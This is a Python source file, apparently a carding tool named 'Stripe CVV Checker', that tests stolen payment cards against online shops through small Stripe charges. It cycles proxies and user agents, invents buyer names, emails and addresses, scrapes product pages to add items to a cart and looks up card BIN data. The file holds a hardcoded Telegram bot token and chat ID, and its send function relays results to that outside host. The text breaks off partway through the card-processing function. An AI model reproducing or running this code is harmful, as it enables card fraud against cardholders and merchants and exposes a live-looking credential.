#!/usr/bin/env python3
"""
Stripe CVV Checker - Python Implementation
Converted from PHP to pure Python
"""

import os
import re
import json
import random
import string
import time
import tempfile
from datetime import datetime
from urllib.parse import urlencode, urlparse, parse_qs
import requests

# Set timezone
os.environ['TZ'] = 'Asia/Manila'

# Telegram Bot Configuration
TELEGRAM_TOKEN = "7723561160:AAHZp0guO69EmC_BumauDsDeseTvh7GY3qA"
CHAT_ID = "7405188060"


def send_to_telegram(message: str, token: str = TELEGRAM_TOKEN, chat_id: str = CHAT_ID) -> None:
    """Send message to Telegram"""
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    params = {"chat_id": chat_id, "text": message}
    try:
        requests.get(url, params=params, timeout=10)
    except Exception:
        pass


def get_str(string: str, start: str, end: str) -> str:
    """Extract string between two delimiters"""
    try:
        parts = string.split(start)
        if len(parts) > 1:
            parts = parts[1].split(end)
            return parts[0]
    except Exception:
        pass
    return ""


def get_random_word(length: int = 20) -> str:
    """Generate random word"""
    letters = list(string.ascii_letters)
    random.shuffle(letters)
    return ''.join(letters[:length])


def device_id(length: int) -> str:
    """Generate device ID"""
    characters = '0123456789abcdefghijklmnopqrstuvwxyz'
    return ''.join(random.choice(characters) for _ in range(length))


def generate_guid() -> str:
    """Generate GUID-like string"""
    return f"{device_id(8)}-{device_id(4)}-{device_id(4)}-{device_id(4)}-{device_id(12)}"


# User agents list
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36",
]

# Address data by country
ADDRESSES = {
    'NZ': [
        {'street': '248 Princes Street', 'city': 'Grafton', 'zip': '1010', 'state': 'Auckland', 'phone': '(028) 8784-059'},
        {'street': '75 Queen Street', 'city': 'Auckland', 'zip': '1010', 'state': 'Auckland', 'phone': '(029) 1234-567'},
        {'street': '12 Victoria Avenue', 'city': 'Wanganui', 'zip': '4500', 'state': 'Manawatu-Wanganui', 'phone': '(021) 9876-543'},
        {'street': '34 Durham Street', 'city': 'Tauranga', 'zip': '3110', 'state': 'Bay of Plenty', 'phone': '(020) 1122-3344'},
        {'street': '9 Lambie Drive', 'city': 'Manukau', 'zip': '2025', 'state': 'Auckland', 'phone': '(027) 4444-555'},
        {'street': '153 Featherston Street', 'city': 'Wellington', 'zip': '6011', 'state': 'Wellington', 'phone': '(022) 3333-444'},
        {'street': '58 Moorhouse Avenue', 'city': 'Christchurch', 'zip': '8011', 'state': 'Canterbury', 'phone': '(023) 5555-666'},
    ],
    'AU': [
        {'street': '123 George Street', 'city': 'Sydney', 'zip': '2000', 'state': 'NSW', 'phone': '+61 2 1234 5678'},
        {'street': '456 Collins Street', 'city': 'Melbourne', 'zip': '3000', 'state': 'VIC', 'phone': '+61 3 8765 4321'},
        {'street': '789 Queen Street', 'city': 'Brisbane', 'zip': '4000', 'state': 'QLD', 'phone': '+61 7 9876 5432'},
        {'street': '101 King William Street', 'city': 'Adelaide', 'zip': '5000', 'state': 'SA', 'phone': '+61 8 1234 5678'},
        {'street': '202 Murray Street', 'city': 'Perth', 'zip': '6000', 'state': 'WA', 'phone': '+61 8 8765 4321'},
        {'street': '303 Hobart Road', 'city': 'Hobart', 'zip': '7000', 'state': 'TAS', 'phone': '+61 3 1234 9876'},
        {'street': '404 Darwin Avenue', 'city': 'Darwin', 'zip': '0800', 'state': 'NT', 'phone': '+61 8 8765 1234'},
    ],
    'JP': [
        {'street': '1 Chome-1-2 Oshiage', 'city': 'Sumida City, Tokyo', 'zip': '131-0045', 'state': 'Tokyo', 'phone': '+81 3-1234-5678'},
        {'street': '2-3-4 Shinjuku', 'city': 'Shinjuku, Tokyo', 'zip': '160-0022', 'state': 'Tokyo', 'phone': '+81 3-8765-4321'},
        {'street': '3 Chome-5-6 Akihabara', 'city': 'Chiyoda City, Tokyo', 'zip': '101-0021', 'state': 'Tokyo', 'phone': '+81 3-2345-6789'},
        {'street': '4-7-8 Ginza', 'city': 'Chuo City, Tokyo', 'zip': '104-0061', 'state': 'Tokyo', 'phone': '+81 3-3456-7890'},
        {'street': '5-9-10 Roppongi', 'city': 'Minato City, Tokyo', 'zip': '106-0032', 'state': 'Tokyo', 'phone': '+81 3-4567-8901'},
        {'street': '6-11-12 Harajuku', 'city': 'Shibuya City, Tokyo', 'zip': '150-0001', 'state': 'Tokyo', 'phone': '+81 3-5678-9012'},
        {'street': '7-13-14 Ueno', 'city': 'Taito City, Tokyo', 'zip': '110-0005', 'state': 'Tokyo', 'phone': '+81 3-6789-0123'},
    ],
    'PH': [
        {'street': '1234 Makati Ave', 'city': 'Makati', 'zip': '1200', 'state': 'Metro Manila', 'phone': '+63 2 1234 5678'},
        {'street': '5678 Bonifacio Drive', 'city': 'Taguig', 'zip': '1634', 'state': 'Metro Manila', 'phone': '+63 2 8765 4321'},
        {'street': '4321 Quezon Blvd', 'city': 'Quezon City', 'zip': '1100', 'state': 'Metro Manila', 'phone': '+63 2 3344 5566'},
        {'street': '7890 Cebu South Rd', 'city': 'Cebu City', 'zip': '6000', 'state': 'Central Visayas', 'phone': '+63 32 123 4567'},
        {'street': '2468 Davao St', 'city': 'Davao City', 'zip': '8000', 'state': 'Davao Region', 'phone': '+63 82 987 6543'},
        {'street': '1357 Iloilo Blvd', 'city': 'Iloilo City', 'zip': '5000', 'state': 'Western Visayas', 'phone': '+63 33 765 4321'},
        {'street': '3690 Bacolod St', 'city': 'Bacolod City', 'zip': '6100', 'state': 'Western Visayas', 'phone': '+63 34 234 5678'},
    ],
    'MY': [
        {'street': 'No 56, Jalan Bukit Bintang', 'city': 'Kuala Lumpur', 'zip': '55100', 'state': 'Wilayah Persekutuan', 'phone': '+60 3-1234 5678'},
        {'street': '700 Jln Sultan Iskandar Bintulu Service Industrial Est Bintulu Bintulu', 'city': 'Bintulu', 'zip': '97000', 'state': 'Sarawak', 'phone': '+60 608-6366666'},
        {'street': 'No 78, Jalan Ampang', 'city': 'Kuala Lumpur', 'zip': '50450', 'state': 'Wilayah Persekutuan', 'phone': '+60 3-8765 4321'},
        {'street': 'Lot 12, Jalan Tunku Abdul Rahman', 'city': 'Kuala Lumpur', 'zip': '50100', 'state': 'Wilayah Persekutuan', 'phone': '+60 3-9988 7766'},
        {'street': '123, Jalan Setia Raja', 'city': 'Ipoh', 'zip': '30000', 'state': 'Perak', 'phone': '+60 5-254 6789'},
        {'street': '45, Jalan Merdeka', 'city': 'George Town', 'zip': '10200', 'state': 'Penang', 'phone': '+60 4-222 3333'},
        {'street': '89, Jalan Bukit Rimau', 'city': 'Shah Alam', 'zip': '40000', 'state': 'Selangor', 'phone': '+60 3-5566 7788'},
    ],
    'GB': [
        {'street': '10 Downing Street', 'city': 'London', 'zip': 'SW1A 2AA', 'state': '', 'phone': '+44 20 7925 0918'},
        {'street': '221B Baker Street', 'city': 'London', 'zip': 'NW1 6XE', 'state': '', 'phone': '+44 20 7224 3688'},
        {'street': '160 Piccadilly', 'city': 'London', 'zip': 'W1J 9EB', 'state': '', 'phone': '+44 20 7493 4944'},
        {'street': '30 St Mary Axe', 'city': 'London', 'zip': 'EC3A 8BF', 'state': '', 'phone': '+44 20 7626 1600'},
        {'street': '1-5 Cannon Street', 'city': 'London', 'zip': 'EC4N 5DX', 'state': '', 'phone': '+44 20 7606 1000'},
        {'street': '14 Regent Street', 'city': 'London', 'zip': 'SW1Y 4PH', 'state': '', 'phone': '+44 20 7930 0800'},
        {'street': '50 Queen Victoria Street', 'city': 'London', 'zip': 'EC4N 4SA', 'state': '', 'phone': '+44 20 7283 4000'},
    ],
    'CA': [
        {'street': '123 Main Street', 'city': 'Toronto', 'zip': 'M5H 2N2', 'state': 'Ontario', 'phone': '(416) 555-0123'},
        {'street': '456 Maple Avenue', 'city': 'Vancouver', 'zip': 'V6E 1B5', 'state': 'British Columbia', 'phone': '(604) 555-7890'},
        {'street': '789 King Street', 'city': 'Montreal', 'zip': 'H3A 1J9', 'state': 'Quebec', 'phone': '(514) 555-3456'},
        {'street': '101 Wellington Street', 'city': 'Ottawa', 'zip': 'K1A 0A9', 'state': 'Ontario', 'phone': '(613) 555-6789'},
        {'street': '202 Spring Garden Road', 'city': 'Halifax', 'zip': 'B3J 1Y5', 'state': 'Nova Scotia', 'phone': '(902) 555-4321'},
    ],
    'SG': [
        {'street': '10 Anson Road', 'city': 'Singapore', 'zip': '079903', 'state': 'Central Region', 'phone': '(+65) 6221-1234'},
        {'street': '1 Raffles Place', 'city': 'Singapore', 'zip': '048616', 'state': 'Central Region', 'phone': '(+65) 6532-5678'},
        {'street': '101 Thomson Road', 'city': 'Singapore', 'zip': '307591', 'state': 'Central Region', 'phone': '(+65) 6253-4567'},
        {'street': '3 Temasek Boulevard', 'city': 'Singapore', 'zip': '038983', 'state': 'Central Region', 'phone': '(+65) 6333-7890'},
        {'street': '400 Orchard Road', 'city': 'Singapore', 'zip': '238875', 'state': 'Central Region', 'phone': '(+65) 6738-1122'},
    ],
    'TH': [
        {'street': '123 Sukhumvit Road', 'city': 'Bangkok', 'zip': '10110', 'state': 'Bangkok', 'phone': '(+66) 2-123-4567'},
        {'street': '456 Silom Road', 'city': 'Bangkok', 'zip': '10500', 'state': 'Bangkok', 'phone': '(+66) 2-234-5678'},
        {'street': '789 Nimmanhemin Road', 'city': 'Chiang Mai', 'zip': '50200', 'state': 'Chiang Mai', 'phone': '(+66) 53-345-678'},
        {'street': '12 Ratchadamnoen Road', 'city': 'Ayutthaya', 'zip': '13000', 'state': 'Phra Nakhon Si Ayutthaya', 'phone': '(+66) 35-212-345'},
        {'street': '55 Pattaya Beach Road', 'city': 'Pattaya', 'zip': '20150', 'state': 'Chonburi', 'phone': '(+66) 38-412-345'},
    ],
    'HK': [
        {'street': "1 Queen's Road Central", 'city': 'Central', 'zip': '', 'state': 'Hong Kong Island', 'phone': '(+852) 2523-1234'},
        {'street': '88 Gloucester Road', 'city': 'Wan Chai', 'zip': '', 'state': 'Hong Kong Island', 'phone': '(+852) 2598-5678'},
        {'street': '15 Salisbury Road', 'city': 'Tsim Sha Tsui', 'zip': '', 'state': 'Kowloon', 'phone': '(+852) 2312-3456'},
        {'street': '18 Nathan Road', 'city': 'Mong Kok', 'zip': '', 'state': 'Kowloon', 'phone': '(+852) 2384-7890'},
        {'street': '28 Tung Chung Road', 'city': 'Lantau Island', 'zip': '', 'state': 'New Territories', 'phone': '(+852) 2985-1234'},
    ],
    'ZA': [
        {'street': '10 Adderley Street', 'city': 'Cape Town', 'zip': '8000', 'state': 'Western Cape', 'phone': '(+27) 21-123-4567'},
        {'street': '150 Rivonia Road', 'city': 'Sandton', 'zip': '2196', 'state': 'Gauteng', 'phone': '(+27) 11-234-5678'},
        {'street': '45 Florida Road', 'city': 'Durban', 'zip': '4001', 'state': 'KwaZulu-Natal', 'phone': '(+27) 31-345-6789'},
        {'street': '33 Church Street', 'city': 'Stellenbosch', 'zip': '7600', 'state': 'Western Cape', 'phone': '(+27) 21-888-1111'},
        {'street': '88 Voortrekker Road', 'city': 'Bellville', 'zip': '7530', 'state': 'Western Cape', 'phone': '(+27) 21-555-2222'},
    ],
    'NL': [
        {'street': '1 Dam Square', 'city': 'Amsterdam', 'zip': '1012 JS', 'state': 'North Holland', 'phone': '(+31) 20-555-1234'},
        {'street': '100 Mauritskade', 'city': 'The Hague', 'zip': '2599 BR', 'state': 'South Holland', 'phone': '(+31) 70-789-4567'},
        {'street': '50 Binnenrotte', 'city': 'Rotterdam', 'zip': '3011 HC', 'state': 'South Holland', 'phone': '(+31) 10-234-5678'},
        {'street': '10 Grote Markt', 'city': 'Groningen', 'zip': '9711 LV', 'state': 'Groningen', 'phone': '(+31) 50-123-4567'},
        {'street': '5 Domplein', 'city': 'Utrecht', 'zip': '3512 JC', 'state': 'Utrecht', 'phone': '(+31) 30-555-7890'},
    ],
    'US': [
        {'street': '1600 Pennsylvania Avenue NW', 'city': 'Washington', 'zip': '20500', 'state': 'DC', 'phone': '+1 202-456-1111'},
        {'street': '1 Infinite Loop', 'city': 'Cupertino', 'zip': '95014', 'state': 'CA', 'phone': '+1 408-996-1010'},
        {'street': '350 Fifth Avenue', 'city': 'New York', 'zip': '10118', 'state': 'NY', 'phone': '+1 212-736-3100'},
        {'street': '221B Baker Street', 'city': 'New York', 'zip': '10001', 'state': 'NY', 'phone': '+1 212-555-0101'},
        {'street': '500 S Buena Vista St', 'city': 'Burbank', 'zip': '91521', 'state': 'CA', 'phone': '+1 818-560-1000'},
        {'street': '1 Microsoft Way', 'city': 'Redmond', 'zip': '98052', 'state': 'WA', 'phone': '+1 425-882-8080'},
        {'street': '160 Spear Street', 'city': 'San Francisco', 'zip': '94105', 'state': 'CA', 'phone': '+1 415-555-0199'},
    ],
}

# Name lists
FIRST_NAMES = [
    'John', 'Kyla', 'Sarah', 'Michael', 'Emma', 'James', 'Olivia', 'William', 'Ava', 'Benjamin',
    'Isabella', 'Jacob', 'Lily', 'Daniel', 'Mia', 'Alexander', 'Charlotte', 'Samuel', 'Sophia', 'Matthew',
    'Amelia', 'David', 'Chloe', 'Luke', 'Ella', 'Henry', 'Grace', 'Andrew', 'Natalie', 'Ethan',
    'Harper', 'Jack', 'Scarlett', 'Ryan', 'Abigail', 'Noah', 'Leah', 'Joshua', 'Zoe', 'Caleb',
    'Alice', 'Nathan', 'Hannah', 'Isaac', 'Victoria', 'Mason', 'Audrey', 'Elijah', 'Evelyn', 'Dylan',
]

LAST_NAMES = [
    'Smith', 'Johnson', 'Williams', 'Jones', 'Brown', 'Davis', 'Miller', 'Wilson', 'Moore', 'Taylor',
    'Anderson', 'Thomas', 'Jackson', 'White', 'Harris', 'Martin', 'Thompson', 'Garcia', 'Martinez', 'Roberts',
    'Walker', 'Perez', 'Young', 'Allen', 'King', 'Wright', 'Scott', 'Green', 'Adams', 'Baker',
    'Gonzalez', 'Nelson', 'Carter', 'Mitchell', 'Evans', 'Collins', 'Stewart', 'Sanchez', 'Morales', 'Murphy',
]

EMAIL_DOMAINS = [
    'gmail.com', 'yahoo.com', 'outlook.com', 'edu.ph', 'edu.pl',
    'icloud.com', 'zoho.com', 'aol.com', 'protonmail.com', 'hotmail.com',
    'mail.com', 'live.com', 'fastmail.com', 'gmx.com', 'mail.ru',
]


def get_card_type(cc: str) -> dict:
    """Determine card type from card number"""
    if cc.startswith('4'):
        return {'type': 'visa', 'brand': 'Visa', 'code1': 'VI', 'code2': 'Visa', 'code3': 'VISA', 'code4': '001'}
    elif cc.startswith('5'):
        return {'type': 'mastercard', 'brand': 'MasterCard', 'code1': 'MC', 'code2': 'MasterCard', 'code3': 'MASTERCARD', 'code4': '002'}
    elif cc.startswith('34') or cc.startswith('37'):
        return {'type': 'americanexpress', 'brand': 'American Express', 'code1': 'AE', 'code2': 'American Express', 'code3': 'AMERICAN EXPRESS', 'code4': '003'}
    elif cc.startswith('6011') or cc.startswith('65') or (cc[:6].isdigit() and 622126 <= int(cc[:6]) <= 622925):
        return {'type': 'discover', 'brand': 'Discover', 'code1': 'DI', 'code2': 'Discover', 'code3': 'DISCOVER', 'code4': '004'}
    return {'type': 'unknown', 'brand': 'Unknown', 'code1': None, 'code2': None, 'code3': None, 'code4': None}


def get_country_from_domain(hostname: str) -> str:
    """Determine country based on site domain"""
    hostname = hostname.lower()
    if hostname.endswith('.co.uk'):
        return 'GB'
    elif hostname.endswith('.au'):
        return 'AU'
    elif hostname.endswith('.ca'):
        return 'CA'
    elif hostname.endswith('.co.nz'):
        return 'NZ'
    elif hostname.endswith('.jp'):
        return 'JP'
    elif hostname.endswith('.ph'):
        return 'PH'
    elif hostname.endswith('.my'):
        return 'MY'
    elif hostname.endswith('.sg'):
        return 'SG'
    elif hostname.endswith('.th'):
        return 'TH'
    elif hostname.endswith('.nl'):
        return 'NL'
    elif hostname.endswith('.hk'):
        return 'HK'
    elif hostname.endswith('.co.za'):
        return 'ZA'
    return 'US'


def fetch_current_ip(session: requests.Session, proxies: dict = None) -> str:
    """Fetch and mask current IP"""
    try:
        response = session.get('https://ip.zxq.co/', proxies=proxies, timeout=10)
        data = response.json()
        if 'ip' in data:
            ip_parts = data['ip'].split('.')
            if len(ip_parts) == 4:
                ip_parts[2] = 'xxx'
                ip_parts[3] = 'xx'
                return '.'.join(ip_parts)
    except Exception:
        pass
    return 'Unknown'


def generate_random_name() -> tuple:
    """Generate random first and last name"""
    return random.choice(FIRST_NAMES), random.choice(LAST_NAMES)


def generate_random_email(fname: str, lname: str) -> str:
    """Generate random email"""
    domain = random.choice(EMAIL_DOMAINS)
    return f"{fname.lower()}.{lname.lower()}@{domain}"


# Country to flag emoji mapping
COUNTRY_FLAGS = {
    'US': '🇺🇸', 'GB': '🇬🇧', 'UK': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'NZ': '🇳🇿',
    'JP': '🇯🇵', 'PH': '🇵🇭', 'MY': '🇲🇾', 'SG': '🇸🇬', 'TH': '🇹🇭', 'HK': '🇭🇰',
    'ZA': '🇿🇦', 'NL': '🇳🇱', 'DE': '🇩🇪', 'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸',
    'PT': '🇵🇹', 'BR': '🇧🇷', 'MX': '🇲🇽', 'AR': '🇦🇷', 'CL': '🇨🇱', 'CO': '🇨🇴',
    'IN': '🇮🇳', 'PK': '🇵🇰', 'BD': '🇧🇩', 'ID': '🇮🇩', 'VN': '🇻🇳', 'KR': '🇰🇷',
    'CN': '🇨🇳', 'TW': '🇹🇼', 'RU': '🇷🇺', 'UA': '🇺🇦', 'PL': '🇵🇱', 'CZ': '🇨🇿',
    'AT': '🇦🇹', 'CH': '🇨🇭', 'BE': '🇧🇪', 'SE': '🇸🇪', 'NO': '🇳🇴', 'DK': '🇩🇰',
    'FI': '🇫🇮', 'IE': '🇮🇪', 'GR': '🇬🇷', 'TR': '🇹🇷', 'IL': '🇮🇱', 'AE': '🇦🇪',
    'SA': '🇸🇦', 'EG': '🇪🇬', 'NG': '🇳🇬', 'KE': '🇰🇪', 'GH': '🇬🇭', 'MA': '🇲🇦',
    'RO': '🇷🇴', 'HU': '🇭🇺', 'SK': '🇸🇰', 'BG': '🇧🇬', 'HR': '🇭🇷', 'RS': '🇷🇸',
    'SI': '🇸🇮', 'LT': '🇱🇹', 'LV': '🇱🇻', 'EE': '🇪🇪', 'CY': '🇨🇾', 'MT': '🇲🇹',
    'LU': '🇱🇺', 'IS': '🇮🇸', 'NP': '🇳🇵', 'LK': '🇱🇰', 'MM': '🇲🇲', 'KH': '🇰🇭',
    'LA': '🇱🇦', 'BN': '🇧🇳', 'MO': '🇲🇴', 'PE': '🇵🇪', 'VE': '🇻🇪', 'EC': '🇪🇨',
    'UY': '🇺🇾', 'PY': '🇵🇾', 'BO': '🇧🇴', 'CR': '🇨🇷', 'PA': '🇵🇦', 'GT': '🇬🇹',
    'HN': '🇭🇳', 'SV': '🇸🇻', 'NI': '🇳🇮', 'DO': '🇩🇴', 'PR': '🇵🇷', 'JM': '🇯🇲',
    'TT': '🇹🇹', 'BB': '🇧🇧', 'BS': '🇧🇸', 'CU': '🇨🇺', 'HT': '🇭🇹', 'QA': '🇶🇦',
    'KW': '🇰🇼', 'BH': '🇧🇭', 'OM': '🇴🇲', 'JO': '🇯🇴', 'LB': '🇱🇧', 'IQ': '🇮🇶',
    'IR': '🇮🇷', 'AF': '🇦🇫', 'KZ': '🇰🇿', 'UZ': '🇺🇿', 'AZ': '🇦🇿', 'GE': '🇬🇪',
    'AM': '🇦🇲', 'BY': '🇧🇾', 'MD': '🇲🇩', 'MN': '🇲🇳', 'KG': '🇰🇬', 'TJ': '🇹🇯',
    'TM': '🇹🇲', 'UNITED STATES': '🇺🇸', 'UNITED KINGDOM': '🇬🇧', 'CANADA': '🇨🇦',
    'AUSTRALIA': '🇦🇺', 'NEW ZEALAND': '🇳🇿', 'JAPAN': '🇯🇵', 'PHILIPPINES': '🇵🇭',
    'MALAYSIA': '🇲🇾', 'SINGAPORE': '🇸🇬', 'THAILAND': '🇹🇭', 'HONG KONG': '🇭🇰',
    'SOUTH AFRICA': '🇿🇦', 'NETHERLANDS': '🇳🇱', 'GERMANY': '🇩🇪', 'FRANCE': '🇫🇷',
    'ITALY': '🇮🇹', 'SPAIN': '🇪🇸', 'PORTUGAL': '🇵🇹', 'BRAZIL': '🇧🇷', 'MEXICO': '🇲🇽',
    'ARGENTINA': '🇦🇷', 'CHILE': '🇨🇱', 'COLOMBIA': '🇨🇴', 'INDIA': '🇮🇳', 'PAKISTAN': '🇵🇰',
    'BANGLADESH': '🇧🇩', 'INDONESIA': '🇮🇩', 'VIETNAM': '🇻🇳', 'SOUTH KOREA': '🇰🇷',
    'KOREA': '🇰🇷', 'CHINA': '🇨🇳', 'TAIWAN': '🇹🇼', 'RUSSIA': '🇷🇺', 'UKRAINE': '🇺🇦',
    'POLAND': '🇵🇱', 'CZECH REPUBLIC': '🇨🇿', 'AUSTRIA': '🇦🇹', 'SWITZERLAND': '🇨🇭',
    'BELGIUM': '🇧🇪', 'SWEDEN': '🇸🇪', 'NORWAY': '🇳🇴', 'DENMARK': '🇩🇰', 'FINLAND': '🇫🇮',
    'IRELAND': '🇮🇪', 'GREECE': '🇬🇷', 'TURKEY': '🇹🇷', 'ISRAEL': '🇮🇱',
    'UNITED ARAB EMIRATES': '🇦🇪', 'UAE': '🇦🇪', 'SAUDI ARABIA': '🇸🇦', 'EGYPT': '🇪🇬',
    'NIGERIA': '🇳🇬', 'KENYA': '🇰🇪', 'GHANA': '🇬🇭', 'MOROCCO': '🇲🇦',
}


def get_country_flag(country: str) -> str:
    """Get flag emoji for a country"""
    if not country:
        return '🏳️'
    country_upper = country.upper().strip()
    return COUNTRY_FLAGS.get(country_upper, '🏳️')


def format_response(status: str, status_emoji: str, card: str, price: str, response_msg: str, 
                    bin_info: dict, elapsed_time: float) -> str:
    """Format the response in the new style"""
    return f"""{status} {status_emoji}

𝗖𝗖 ⇾ {card}

𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge "{price}"

𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_msg}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}

𝗕𝗮𝗻𝗸: {bin_info['bank']}

𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['flag']}

𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀

𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB"""


def get_bin_info(cc6: str, session: requests.Session, ua: str) -> dict:
    """Get BIN information"""
    try:
        headers = {'user-agent': ua, 'accept': 'application/json'}
        response = session.get(f'https://bins.antipublic.cc/bins/{cc6}', headers=headers, timeout=10)
        data = response.json()
        country_name = data.get('country_name', 'Not found')
        country_code = data.get('country', '')
        return {
            'bin': data.get('bin', cc6),
            'brand': data.get('brand', 'Not found'),
            'type': data.get('type', 'Not found'),
            'level': data.get('level', 'Not found'),
            'bank': data.get('bank', 'Not found'),
            'country': country_name,
            'country_code': country_code,
            'flag': get_country_flag(country_code) if country_code else get_country_flag(country_name),
        }
    except Exception:
        return {
            'bin': cc6,
            'brand': 'Not found',
            'type': 'Not found',
            'level': 'Not found',
            'bank': 'Not found',
            'country': 'Not found',
            'country_code': '',
            'flag': '🏳️',
        }


def process_card(lista: str, sites: str, proxy: str = None) -> str:
    """
    Process a card check
    
    Args:
        lista: Card data in format CC|MM|YY|CVV
        sites: Comma-separated list of site URLs
        proxy: Optional proxy in format IP:PORT or IP:PORT:USER:PASS
    
    Returns:
        Result string
    """
    time_start = time.time()
    
    # Parse card data
    parts = lista.split('|')
    if len(parts) < 4:
        elapsed_time = time.time() - time_start
        bin_info = {
            'brand': 'Not found', 'type': 'Not found', 'level': 'Not found',
            'bank': 'Not found', 'country': 'Not found', 'flag': '🏳️'
        }
        return format_response("DECLINED", "❌", lista, "N/A", "Invalid Card Format", bin_info, elapsed_time)
    
    cc = parts[0]
    mes = parts[1]
    ano = parts[2] if len(parts[2]) == 4 else f"20{parts[2]}"
    cvv = parts[3]
    
    cc6 = cc[:6]
    card_info = get_card_type(cc)
    
    # Setup session
    session = requests.Session()
    ua = random.choice(USER_AGENTS)
    
    # Setup proxy
    proxies = None
    if proxy:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) >= 2:
            proxy_url = f"{proxy_parts[0]}:{proxy_parts[1]}"
            if len(proxy_parts) == 4:
                proxy_url = f"{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
            proxies = {
                'http': f'http://{proxy_url}',
                'https': f'http://{proxy_url}'
            }
    
    # Get IP
    ip = fetch_current_ip(session, proxies)
    
    # Parse sites
    urls = [url.strip() for url in sites.split(',') if url.strip()]
    if not urls:
        elapsed_time = time.time() - time_start
        bin_info = get_bin_info(cc6, session, ua)
        return format_response("DECLINED", "❌", lista, "N/A", "No Sites Provided", bin_info, elapsed_time)
    
    # Select random URL
    product_page_url = random.choice(urls)
    line_number = urls.index(product_page_url) + 1
    
    parsed_url = urlparse(product_page_url)
    hostname = parsed_url.netloc
    
    # Generate IDs
    guid = generate_guid()
    muid = generate_guid()
    sid = generate_guid()
    
    # Headers
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'origin': f'https://{hostname}',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'referer': f'https://{hostname}/cart',
        'user-agent': ua,
    }
    
    try:
        # Fetch product page
        response = session.get(product_page_url, headers=headers, proxies=proxies, timeout=20, verify=False)
        product_page_content = response.text
        
        # Extract product ID and variation
        product_id = None
        variation_id = None
        variation_data = None
        
        # Try to find product ID from form
        form_match = re.search(r'data-product_id="(\d+)"', product_page_content)
        if form_match:
            product_id = form_match.group(1)
        
        # Try variations
        variations_match = re.search(r'data-product_variations="([^"]+)"', product_page_content)
        if variations_match:
            try:
                variation_data = json.loads(variations_match.group(1).replace('&quot;', '"'))
            except Exception:
                pass
        
        # Fallback product ID extraction
        if not product_id:
            input_match = re.search(r'name="(?:product_id|add-to-cart)"\s+value="(\d+)"', product_page_content)
            if input_match:
                product_id = input_match.group(1)
        
        if not product_id:
            button_match = re.search(r'<button[^>]*name="add-to-cart"[^>]*value="(\d+)"', product_page_content)
            if button_match:
                product_id = button_match.group(1)
        
        if not product_id:
            bin_info = get_bin_info(cc6, session, ua)
            elapsed_time = time.time() - time_start
            return format_response("DECLINED", "❌", lista, "N/A", "Can't find product", bin_info, elapsed_time)
        
        # Build add to cart URL
        query_params = {'quantity': 1, 'add-to-cart': product_id}
        
        if variation_data and len(variation_data) > 0:
            first_variation = variation_data[0]
            variation_id = first_variation.get('variation_id')
